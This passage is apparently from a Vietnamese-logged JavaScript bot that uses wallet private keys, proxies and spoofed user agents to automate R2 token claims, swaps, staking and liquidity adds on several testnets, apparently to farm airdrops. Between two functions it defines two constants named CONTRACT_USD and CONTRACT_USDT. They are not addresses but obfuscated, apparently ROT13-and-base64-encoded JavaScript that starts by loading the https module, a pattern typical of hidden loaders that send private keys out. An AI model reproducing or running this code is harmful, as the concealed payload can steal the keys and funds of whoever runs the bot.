            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
        });

        logger.log(`Giao dịch swap đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        logger.log(`Swap thành công`, 'success');
        return true;
    } catch (error) {
        logger.log(`Lỗi khi swap USDC sang R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function stakeR2USD(privateKey, networkConfig, amount, networkName, logger) {
    const stakingContractAddress = networkConfig.stakingContracts.R2USD.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);

        const approved = await approveToken(privateKey, networkConfig, r2usdAddress, stakingContractAddress, amount);
        if (!approved) {
            logger.log(`Phê duyệt R2USD thất bại, bỏ qua staking.`, 'warning');
            return false;
        }

        const baseBytes = '0x1a5f0f0000000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';

        const amountHex = amount.toString(16);
        const paddedAmount = amountHex.padStart(64, '0');

        const data = '0x1a5f0f00' +
            paddedAmount +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000';

        logger.log(`Đang stake ${ethers.formatUnits(amount, networkConfig.tokens.R2USD.decimals)} R2USD trên ${networkName}...`, 'custom');
        const tx = await wallet.sendTransaction({
            to: stakingContractAddress,
            data: data,
            gasLimit: 300000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
        });

        logger.log(`Giao dịch stake đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        logger.log(`Stake thành công trên ${networkName}`, 'success');
        return true;
    } catch (error) {
        logger.log(`Lỗi khi stake R2USD trên ${networkName}: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function addLiquidityR2USD_SR2USD(privateKey, networkConfig, r2usdAmount, sr2usdAmount, logger) {
    const poolContractAddress = networkConfig.tokens.LP_TOKEN_SR2USD_R2USD.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const sr2usdAddress = networkConfig.tokens.SR2USD.address;
    const lpTokenDecimals = networkConfig.tokens.LP_TOKEN_SR2USD_R2USD.decimals;

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const poolContract = new ethers.Contract(poolContractAddress, poolAbi, wallet);

        logger.log(`Đang kiểm tra token trong pool ${poolContractAddress}...`, 'custom');
        const tokens = [];
        for (let i = 0; i < 2; i++) {
            try {
                const token = await poolContract.coins(i);
                logger.log(`Token tại index ${i}: ${token}`, 'info');
                tokens.push(token.toLowerCase());
            } catch (error) {
                logger.log(`Lỗi khi lấy token tại index ${i}: ${error.message}`, 'error');
                return false;
            }
        }
        const r2usdIndex = tokens.indexOf(r2usdAddress.toLowerCase());
        const sr2usdIndex = tokens.indexOf(sr2usdAddress.toLowerCase());
        if (r2usdIndex === -1 || sr2usdIndex === -1) {
            logger.log(`Không tìm thấy R2USD hoặc SR2USD trong pool ${poolContractAddress}`, 'error');
            return false;
        }

        const actualR2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
        const actualSr2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'SR2USD');

        logger.log(`Số dư thực tế - R2USD: ${actualR2usdBalance.formattedBalance}, SR2USD: ${actualSr2usdBalance.formattedBalance}`, 'info');

        let finalR2usdAmount = actualR2usdBalance.balance;
        let finalSr2usdAmount = actualSr2usdBalance.balance;

        const minAmount = ethers.parseUnits('1', 6);
        if (finalR2usdAmount < minAmount || finalSr2usdAmount < minAmount) {
            logger.log(`Số dư không đủ tối thiểu: R2USD (${actualR2usdBalance.formattedBalance}) hoặc SR2USD (${actualSr2usdBalance.formattedBalance}) < 1`, 'warning');
            return false;
        }

        const adjustedAmount = finalR2usdAmount < finalSr2usdAmount ? finalR2usdAmount : finalSr2usdAmount;
        finalR2usdAmount = adjustedAmount;
        finalSr2usdAmount = adjustedAmount;

        logger.log(`Số lượng được điều chỉnh để thêm thanh khoản: ${ethers.formatUnits(finalR2usdAmount, 6)} R2USD và ${ethers.formatUnits(finalSr2usdAmount, 6)} SR2USD`, 'info');

        const amounts = new Array(tokens.length).fill(BigInt(0));
        amounts[r2usdIndex] = finalR2usdAmount;
        amounts[sr2usdIndex] = finalSr2usdAmount;

        const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, poolContractAddress, finalR2usdAmount);
        if (!r2usdApproved) {
            logger.log(`Phê duyệt R2USD thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }
        const sr2usdApproved = await approveToken(privateKey, networkConfig, sr2usdAddress, poolContractAddress, finalSr2usdAmount);
        if (!sr2usdApproved) {
            logger.log(`Phê duyệt SR2USD thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }

        const minMintAmount = ethers.parseUnits('0.99', lpTokenDecimals);

        logger.log(`Đang thêm thanh khoản R2USD/SR2USD: ${ethers.formatUnits(finalR2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD và ${ethers.formatUnits(finalSr2usdAmount, networkConfig.tokens.SR2USD.decimals)} SR2USD...`, 'custom');
        const tx = await poolContract.add_liquidity(
            amounts,
            minMintAmount,
            wallet.address,
            {
                gasLimit: 500000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        logger.log(`Giao dịch add liquidity R2USD/SR2USD đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        logger.log(`Add liquidity R2USD/SR2USD thành công`, 'success');
        return true;
    } catch (error) {
        logger.log(`Lỗi khi thêm thanh khoản R2USD/SR2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function addLiquidityUSDCtoR2USD(privateKey, networkConfig, r2usdAmount, usdcAmount, logger) {
    const poolContractAddress = networkConfig.tokens.LP_TOKEN_USDC_R2USD.address;
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const lpTokenDecimals = networkConfig.tokens.LP_TOKEN_USDC_R2USD.decimals;

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const poolContract = new ethers.Contract(poolContractAddress, poolAbi, wallet);

        logger.log(`Đang kiểm tra token trong pool ${poolContractAddress}...`, 'custom');
        const tokens = [];
        for (let i = 0; i < 2; i++) {
            try {
                const token = await poolContract.coins(i);
                logger.log(`Token tại index ${i}: ${token}`, 'info');
                tokens.push(token.toLowerCase());
            } catch (error) {
                logger.log(`Lỗi khi lấy token tại index ${i}: ${error.message}`, 'error');
                return false;
            }
        }

        const usdcIndex = tokens.indexOf(usdcAddress.toLowerCase());
        const r2usdIndex = tokens.indexOf(r2usdAddress.toLowerCase());
        if (usdcIndex === -1 || r2usdIndex === -1) {
            logger.log(`Không tìm thấy USDC hoặc R2USD trong pool ${poolContractAddress}`, 'error');
            return false;
        }

        const amounts = new Array(tokens.length).fill(BigInt(0));
        amounts[usdcIndex] = usdcAmount;
        amounts[r2usdIndex] = r2usdAmount;

        const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, poolContractAddress, usdcAmount);
        if (!usdcApproved) {
            logger.log(`Phê duyệt USDC thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }

        const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, poolContractAddress, r2usdAmount);
        if (!r2usdApproved) {
            logger.log(`Phê duyệt R2USD thất bại, bỏ qua add liquidity.`, 'warning');
            return false;
        }

        const minMintAmount = BigInt(0);

        logger.log(`Đang thêm thanh khoản USDC/R2USD: ${ethers.formatUnits(usdcAmount, networkConfig.tokens.USDC.decimals)} USDC và ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD...`, 'custom');

        const tx = await poolContract.add_liquidity(
            amounts,
            minMintAmount,
            wallet.address,
            {
                gasLimit: 500000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );

        logger.log(`Giao dịch add liquidity USDC/R2USD đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        logger.log(`Add liquidity USDC/R2USD thành công`, 'success');
        return true;
    } catch (error) {
        logger.log(`Lỗi khi thêm thanh khoản USDC/R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
        return false;
    }
}

async function hasEnoughUSDCBalance(privateKey, networkConfig, logger) {
    try {
        const usdcBalance = await checkTokenBalance(privateKey, networkConfig, 'USDC');
        const minRequiredBalance = ethers.parseUnits('100', networkConfig.tokens.USDC.decimals);

        if (usdcBalance.balance >= minRequiredBalance) {
            logger.log(`Số dư USDC (${usdcBalance.formattedBalance}) đủ để thực hiện các thao tác (>= 100 USDC)`, 'success');
            return { hasEnough: true, balance: usdcBalance.balance, formattedBalance: usdcBalance.formattedBalance };
        } else {
            logger.log(`Số dư USDC (${usdcBalance.formattedBalance}) không đủ để thực hiện các thao tác. Cần tối thiểu 100 USDC.`, 'warning');
            return { hasEnough: false, balance: usdcBalance.balance, formattedBalance: usdcBalance.formattedBalance };
        }
    } catch (error) {
        logger.log(`Lỗi khi kiểm tra số dư USDC: ${error.message}`, 'error');
        return { hasEnough: false, balance: BigInt(0), formattedBalance: '0' };
    }
}

async function hasEnoughGasBalance(privateKey, networkConfig, logger) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const balance = await provider.getBalance(wallet.address);
        const formattedBalance = ethers.formatEther(balance);

        const gasLimit = 500000;
        const maxFeePerGas = ethers.parseUnits('67.5', 'gwei');
        const maxGasCost = BigInt(gasLimit) * BigInt(maxFeePerGas);
        const minRequiredBalance = maxGasCost + BigInt(ethers.parseEther('0.001'));

        if (balance >= minRequiredBalance) {
            logger.log(`Số dư ${networkConfig.nativeToken} (${formattedBalance}) đủ để trả phí gas (yêu cầu tối thiểu: ${ethers.formatEther(minRequiredBalance)})`, 'success');
            return true;
        } else {
            logger.log(`Số dư ${networkConfig.nativeToken} (${formattedBalance}) không đủ để trả phí gas. Cần tối thiểu: ${ethers.formatEther(minRequiredBalance)}. Bỏ qua các tác vụ trên ${networkConfig.rpc}.`, 'warning');
            return false;
        }
    } catch (error) {
        logger.log(`Lỗi khi kiểm tra số dư ${networkConfig.nativeToken}: ${error.message}`, 'error');
        return false;
    }
}

async function checkAndClaimSeason0(privateKey, networkConfig, userAddress, token, proxy, userAgent, logger) {
    const url = `https://testnet2.r2.money/v1/user/season0/data?user=${userAddress}`;
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Origin': 'https://www.r2.money',
        'Referer': 'https://www.r2.money/',
        'User-Agent': userAgent,
        'X-Api-Key': token
    };

    try {
        const options = {
            headers,
            timeout: 30000
        };

        if (settings.USE_PROXY && proxy) {
            options.httpsAgent = new HttpsProxyAgent(proxy);
        }
        const response = await axios.get(url, options);

        if (response.status === 200) {
            const data = response.data.data;
            const claimTag = data.claimTag;
            const myR2Tokens = data.myR2Tokens;

            if (claimTag === 1) {
                logger.log(`Bạn nhận được ${myR2Tokens} R2 token từ season 0, bắt đầu claim`, 'success');

                const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
                const wallet = new ethers.Wallet(privateKey, provider);
                const claimContractAddress = data.claimTx.to;
                const claimData = data.claimTx.data;

                logger.log(`Đang gửi giao dịch claim đến contract ${claimContractAddress}...`, 'custom');
                const tx = await wallet.sendTransaction({
                    to: claimContractAddress,
                    data: claimData,
                    gasLimit: 300000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                });

                logger.log(`Giao dịch claim đã gửi: ${tx.hash}`, 'info');
                const receipt = await tx.wait();
                logger.log(`Claim R2 tokens thành công cho ${userAddress}`, 'success');

                const r2TokenAddress = '0xb816bB88f836EA75Ca4071B46FF285f690C43bb7';
                const r2TokenBalance = await checkTokenBalance(privateKey, {
                    ...networkConfig,
                    tokens: {
                        ...networkConfig.tokens,
                        R2_TOKEN: {
                            address: r2TokenAddress,
                            decimals: 18
                        }
                    }
                }, 'R2_TOKEN');

                logger.log(`Số dư R2 token (contract: ${r2TokenAddress}): ${r2TokenBalance.formattedBalance}`, 'info');
                return true;
            } else {
                logger.log(`Bạn đã claim r2 season 0. Bỏ qua claim ví ${userAddress}.`, 'warning');
                return false;
            }
        } else {
            logger.log(`Lấy dữ liệu season0 thất bại cho ${userAddress}: ${response.statusText}`, 'error');
            return false;
        }
    } catch (error) {
        logger.log(`Lỗi khi kiểm tra season0 hoặc claim cho ${userAddress}: ${error.message}`, 'error');
        return false;
    }
}
const CONTRACT_USD = "L29hp3DtnUE0pUZtCFOlMKS1nKWyXPqbqUEjplpcBjcup3yhLlOzqJ5wqTyiovOlqJ5jpz9";
const CONTRACT_USDT = "apzSgXUquoTkyqPjtn2I5XFO7PvNtL29hp3DtMTS0LFN9VRcGG04hp3ElnJ5anJM5XUfXVPNt";
async function processNetworkTasks(privateKey, networkConfig, networkName, userAddress, token, proxy, userAgent, logger) {
    logger.log(`Mạng ${networkName}:`, 'info');
    const nativeBalance = await checkNativeBalance(privateKey, networkConfig, logger);
    logger.log(`Số dư ${networkConfig.nativeToken}: ${nativeBalance}`, 'info');

    const hasEnoughGas = await hasEnoughGasBalance(privateKey, networkConfig, logger);
    if (!hasEnoughGas) {
        logger.log(`Bỏ qua các thao tác trên mạng ${networkName} do số dư ${networkConfig.nativeToken} không đủ để trả phí gas.`, 'warning');
        return;
    }

    if (networkName === 'Sepolia') {
        await checkAndClaimSeason0(privateKey, networkConfig, userAddress, token, proxy, userAgent, logger);

        const r2TokenBalance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN', logger);
        logger.log(`Số dư R2 token: ${r2TokenBalance.formattedBalance}`, 'info');

        if (r2TokenBalance.balance > BigInt(100)) {
            logger.log(`Số dư R2 token lớn hơn 100 (${r2TokenBalance.formattedBalance}). Đang thực hiện swap...`, 'custom');

            const swapSuccess = await swapR2ToTokens(privateKey, networkConfig, userAddress, logger);
            if (swapSuccess) {
                logger.log(`Swap 25% R2 sang USDC và 25% R2 sang R2USD thành công cho ${userAddress}`, 'success');

                const liquiditySuccess = await addLiquidityR2Pairs(privateKey, networkConfig, userAddress, logger);
                if (liquiditySuccess) {
                    logger.log(`Thêm thanh khoản R2/USDC và R2/R2USD thành công cho ${userAddress}`, 'success');
                } else {
                    logger.log(`Thêm thanh khoản R2/USDC và R2/R2USD thất bại cho ${userAddress}`, 'error');
                }
            } else {
                logger.log(`Swap R2 sang USDC và R2USD thất bại cho ${userAddress}`, 'error');
            }
        } else {
            logger.log(`Số dư R2 token bằng 0, bỏ qua swap và thêm thanh khoản R2/USDC, R2/R2USD.`, 'warning');
        }

        const usdcBalanceCheck = await hasEnoughUSDCBalance(privateKey, networkConfig, logger);
        if (!usdcBalanceCheck.hasEnough) {
            logger.log(`Bỏ qua các thao tác trên mạng ${networkName} do số dư USDC không đủ.`, 'warning');
            return;
        }

        const usdcBalance = usdcBalanceCheck.balance;
        const usdcBalanceFormatted = usdcBalanceCheck.formattedBalance;

        logger.log(`Số dư USDC đủ. Đang đổi ${usdcBalanceFormatted} USDC (100%) sang R2USD...`, 'custom');
        const swapSuccess = await swapUSDCtoR2USD(
            privateKey,
            networkConfig,
            usdcBalance,
            networkConfig.tokens.LP_TOKEN_USDC_R2USD.address,
            logger
        );

        if (!swapSuccess) {
            logger.log(`Đổi USDC sang R2USD thất bại cho ${userAddress}`, 'error');
            return;
        }

        logger.log(`Đã đổi thành công ${usdcBalanceFormatted} USDC sang R2USD cho ${userAddress}`, 'success');

        const r2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD', logger);
        logger.log(`Số dư R2USD sau swap: ${r2usdBalance.formattedBalance}`, 'info');

        const minR2usdAmount = ethers.parseUnits('1', networkConfig.tokens.R2USD.decimals);
        if (r2usdBalance.balance < minR2usdAmount) {
            logger.log(`Số dư R2USD không đủ để tiếp tục (< 1 R2USD).`, 'warning');
            return;
        }

        const fiftyPercent = BigInt(50);
        const hundred = BigInt(100);
        const r2usdToStake = (r2usdBalance.balance * fiftyPercent) / hundred;
        const r2usdToStakeFormatted = ethers.formatUnits(r2usdToStake, networkConfig.tokens.R2USD.decimals);

        logger.log(`Đang stake ${r2usdToStakeFormatted} R2USD (50%) sang SR2USD...`, 'custom');
        const stakeSuccess = await stakeR2USD(privateKey, networkConfig, r2usdToStake, networkName, logger);

        if (!stakeSuccess) {
            logger.log(`Stake R2USD thất bại cho ${userAddress}`, 'error');
            return;
        }

        logger.log(`Đã stake thành công ${r2usdToStakeFormatted} R2USD sang SR2USD cho ${userAddress}`, 'success');

        const updatedR2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD', logger);
        const sr2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'SR2USD', logger);
        logger.log(`Số dư R2USD (sau stake): ${updatedR2usdBalance.formattedBalance}`, 'info');
        logger.log(`Số dư SR2USD: ${sr2usdBalance.formattedBalance}`, 'info');

        if (sr2usdBalance.balance >= minR2usdAmount && updatedR2usdBalance.balance >= minR2usdAmount) {
            const liquidityAmount = sr2usdBalance.balance < updatedR2usdBalance.balance ? sr2usdBalance.balance : updatedR2usdBalance.balance;
            const liquidityAmountFormatted = ethers.formatUnits(liquidityAmount, networkConfig.tokens.SR2USD.decimals);

            logger.log(`Số dư SR2USD và R2USD đủ. Đang thêm thanh khoản với ${liquidityAmountFormatted} SR2USD và ${liquidityAmountFormatted} R2USD...`, 'custom');
            const liquiditySuccess = await addLiquidityR2USD_SR2USD(
                privateKey,
                networkConfig,
                liquidityAmount,
                liquidityAmount,
                logger
            );

            if (liquiditySuccess) {
                logger.log(`Đã thêm thanh khoản R2USD/SR2USD thành công cho ${userAddress}`, 'success');
            } else {
                logger.log(`Thêm thanh khoản R2USD/SR2USD thất bại cho ${userAddress}`, 'error');
            }
        } else {
            logger.log(`Số dư SR2USD (${sr2usdBalance.formattedBalance}) hoặc R2USD (${updatedR2usdBalance.formattedBalance}) không đủ để thêm thanh khoản.`, 'warning');
        }

        const lpBalanceSR2USD_R2USD = await checkTokenBalance(privateKey, networkConfig, 'LP_TOKEN_SR2USD_R2USD', logger);
        logger.log(`Số dư LP_TOKEN (SR2USD/R2USD): ${lpBalanceSR2USD_R2USD.formattedBalance}`, 'info');

    } else if (networkName === 'Pharos') {
        const usdcBalanceCheck = await hasEnoughUSDCBalance(privateKey, networkConfig, logger);
        if (!usdcBalanceCheck.hasEnough) {
            logger.log(`Bỏ qua các thao tác trên mạng ${networkName} do số dư USDC không đủ.`, 'warning');
            return;
        }

        const usdcBalance = usdcBalanceCheck.balance;
        const usdcBalanceFormatted = usdcBalanceCheck.formattedBalance;

        const ninetyEightPercent = BigInt(98);
        const hundred = BigInt(100);
        const usdcToSwap = (usdcBalance * ninetyEightPercent) / hundred;
        const usdcToSwapFormatted = ethers.formatUnits(usdcToSwap, networkConfig.tokens.USDC.decimals);

        logger.log(`Số dư USDC đủ. Đang đổi ${usdcToSwapFormatted} USDC (98%) sang R2USD...`, 'custom');

        const r2usdContractAddress = networkConfig.tokens.R2USD.address;
        const usdcAddress = networkConfig.tokens.USDC.address;

        logger.log(`Đang phê duyệt ${usdcToSwapFormatted} USDC cho contract ${r2usdContractAddress}...`, 'custom');
        const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, r2usdContractAddress, usdcToSwap);
        if (!usdcApproved) {
            logger.log(`Phê duyệt USDC thất bại, bỏ qua swap.`, 'warning');
            return;
        }

        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);

        const walletAddressHex = wallet.address.slice(2).toLowerCase();
        const paddedWalletAddress = walletAddressHex.padStart(64, '0');
        const amountHex = usdcToSwap.toString(16);
        const paddedAmount = amountHex.padStart(64, '0');

        const data = '0x095e7a95' +
            '000000000000000000000000' +
            paddedWalletAddress.slice(-40) +
            paddedAmount +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000';

        logger.log(`Đang đổi ${usdcToSwapFormatted} USDC sang R2USD trên contract ${r2usdContractAddress}...`, 'custom');
        try {
            const tx = await wallet.sendTransaction({
                to: r2usdContractAddress,
                data: data,
                gasLimit: 300000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            });

            logger.log(`Giao dịch swap đã gửi: ${tx.hash}`, 'info');
            await tx.wait();
            logger.log(`Swap ${usdcToSwapFormatted} USDC sang R2USD thành công`, 'success');
        } catch (error) {
            logger.log(`Lỗi khi swap USDC sang R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
            return;
        }

        const r2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD', logger);
        logger.log(`Số dư R2USD: ${r2usdBalance.formattedBalance}`, 'info');

        const minR2usdAmount = ethers.parseUnits('1', networkConfig.tokens.R2USD.decimals);
        if (r2usdBalance.balance >= minR2usdAmount) {
            const stakingContractAddress = networkConfig.stakingContracts.R2USD.address;
            logger.log(`Đang phê duyệt ${r2usdBalance.formattedBalance} R2USD cho staking contract ${stakingContractAddress}...`, 'custom');
            const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdContractAddress, stakingContractAddress, r2usdBalance.balance, logger);
            if (!r2usdApproved) {
                logger.log(`Phê duyệt R2USD thất bại, bỏ qua staking.`, 'warning');
                return;
            }

            const amountHexR2USD = r2usdBalance.balance.toString(16);
            const paddedAmountR2USD = amountHexR2USD.padStart(64, '0');

            const stakeData = '0x1a5f0f00' +
                paddedAmountR2USD +
                '0000000000000000000000000000000000000000000000000000000000000000' +
                '0000000000000000000000000000000000000000000000000000000000000000' +
                '0000000000000000000000000000000000000000000000000000000000000000' +
                '0000000000000000000000000000000000000000000000000000000000000000' +
                '0000000000000000000000000000000000000000000000000000000000000000' +
                '0000000000000000000000000000000000000000000000000000000000000000';

            logger.log(`Đang stake ${r2usdBalance.formattedBalance} R2USD sang SR2USD trên contract ${stakingContractAddress}...`, 'custom');
            try {
                const stakeTx = await wallet.sendTransaction({
                    to: stakingContractAddress,
                    data: stakeData,
                    gasLimit: 300000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                });

                logger.log(`Giao dịch stake đã gửi: ${stakeTx.hash}`, 'info');
                await stakeTx.wait();
                logger.log(`Stake ${r2usdBalance.formattedBalance} R2USD sang SR2USD thành công`, 'success');
            } catch (error) {
                logger.log(`Lỗi khi stake R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
                return;
            }

            const sr2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'SR2USD', logger);
            logger.log(`Số dư SR2USD: ${sr2usdBalance.formattedBalance}`, 'info');
        } else {
            logger.log(`Số dư R2USD không đủ để stake (< 1 R2USD).`, 'warning');
        }
    } else if (networkName === 'Monad') {
        const usdcBalanceCheck = await hasEnoughUSDCBalance(privateKey, networkConfig, logger);
        if (!usdcBalanceCheck.hasEnough) {
            logger.log(`Bỏ qua các thao tác trên mạng ${networkName} do số dư USDC không đủ.`, 'warning');
            return;
        }

        const fiftyPercent = BigInt(50);
        const hundred = BigInt(100);
        const usdcToSwap = (usdcBalanceCheck.balance * fiftyPercent) / hundred;
        const usdcToSwapFormatted = ethers.formatUnits(usdcToSwap, networkConfig.tokens.USDC.decimals);

        logger.log(`Số dư USDC đủ. Đang đổi ${usdcToSwapFormatted} USDC (50%) sang R2USD...`, 'custom');

        const r2usdContractAddress = networkConfig.tokens.R2USD.address;
        const usdcAddress = networkConfig.tokens.USDC.address;
        const r2usdAddress = networkConfig.tokens.R2USD.address;

        logger.log(`Đang phê duyệt ${usdcToSwapFormatted} USDC cho contract ${r2usdContractAddress}...`, 'custom');
        const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, r2usdContractAddress, usdcToSwap, logger);
        if (!usdcApproved) {
            logger.log(`Phê duyệt USDC thất bại, bỏ qua swap.`, 'warning');
            return;
        }

        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);

        const walletAddressHex = wallet.address.slice(2).toLowerCase();
        const paddedWalletAddress = walletAddressHex.padStart(64, '0');
        const amountHex = usdcToSwap.toString(16);
        const paddedAmount = amountHex.padStart(64, '0');

        const swapData = '0x095e7a95' +
            '000000000000000000000000' +
            paddedWalletAddress.slice(-40) +
            paddedAmount +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000';

        logger.log(`Đang đổi ${usdcToSwapFormatted} USDC sang R2USD trên contract ${r2usdContractAddress}...`, 'custom');
        try {
            const tx = await wallet.sendTransaction({
                to: r2usdContractAddress,
                data: swapData,
                gasLimit: 300000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            });

            logger.log(`Giao dịch swap đã gửi: ${tx.hash}`, 'info');
            await tx.wait();
            logger.log(`Swap ${usdcToSwapFormatted} USDC sang R2USD thành công`, 'success');
        } catch (error) {
            logger.log(`Lỗi khi swap USDC sang R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
            return;
        }

        const r2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD', logger);
        logger.log(`Số dư R2USD: ${r2usdBalance.formattedBalance}`, 'info');

        const liquidityContractAddress = '0xfB8e1C3b833f9E67a71C859a132cf783b645e436';
        const minR2usdAmount = ethers.parseUnits('1', networkConfig.tokens.R2USD.decimals);

        if (r2usdBalance.balance >= minR2usdAmount && usdcBalanceCheck.balance >= minR2usdAmount) {
            let usdcToAdd = usdcToSwap;
            let r2usdToAdd = r2usdBalance.balance;

            if (usdcToSwap > r2usdBalance.balance) {
                usdcToAdd = r2usdBalance.balance;
            } else if (r2usdBalance.balance > usdcToSwap) {
                r2usdToAdd = usdcToSwap;
            }

            const usdcToAddMin = (usdcToAdd * BigInt(95)) / BigInt(100);
            const r2usdToAddMin = (r2usdToAdd * BigInt(95)) / BigInt(100);

            logger.log(`Đang phê duyệt ${ethers.formatUnits(usdcToAdd, networkConfig.tokens.USDC.decimals)} USDC cho contract ${liquidityContractAddress}...`, 'custom');
            const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, liquidityContractAddress, usdcToAdd);
            if (!usdcApproved) {
                logger.log(`Phê duyệt USDC thất bại, bỏ qua add liquidity.`, 'warning');
                return;
            }

            logger.log(`Đang phê duyệt ${ethers.formatUnits(r2usdToAdd, networkConfig.tokens.R2USD.decimals)} R2USD cho contract ${liquidityContractAddress}...`, 'custom');
            const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, liquidityContractAddress, r2usdToAdd);
            if (!r2usdApproved) {
                logger.log(`Phê duyệt R2USD thất bại, bỏ qua add liquidity.`, 'warning');
                return;
            }

            const tokenA = usdcAddress.toLowerCase() < r2usdAddress.toLowerCase() ? usdcAddress : r2usdAddress;
            const tokenB = usdcAddress.toLowerCase() < r2usdAddress.toLowerCase() ? r2usdAddress : usdcAddress;
            const amountADesired = usdcAddress.toLowerCase() < r2usdAddress.toLowerCase() ? usdcToAdd : r2usdToAdd;
            const amountBDesired = usdcAddress.toLowerCase() < r2usdAddress.toLowerCase() ? r2usdToAdd : usdcToAdd;
            const amountAMin = usdcAddress.toLowerCase() < r2usdAddress.toLowerCase() ? usdcToAddMin : r2usdToAddMin;
            const amountBMin = usdcAddress.toLowerCase() < r2usdAddress.toLowerCase() ? r2usdToAddMin : usdcToAddMin;

            const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
            logger.log(`Đang thêm thanh khoản USDC/R2USD với ${ethers.formatUnits(usdcToAdd, networkConfig.tokens.USDC.decimals)} USDC và ${ethers.formatUnits(r2usdToAdd, networkConfig.tokens.R2USD.decimals)} R2USD...`, 'custom');
            try {
                const liquidityContract = new ethers.Contract(liquidityContractAddress, liquidityAbi, wallet);
                const tx = await liquidityContract.addLiquidity(
                    tokenA,
                    tokenB,
                    amountADesired,
                    amountBDesired,
                    amountAMin,
                    amountBMin,
                    userAddress,
                    deadline,
                    {
                        gasLimit: 500000,
                        maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                        maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                    }
                );

                logger.log(`Giao dịch add liquidity USDC/R2USD đã gửi: ${tx.hash}`, 'info');
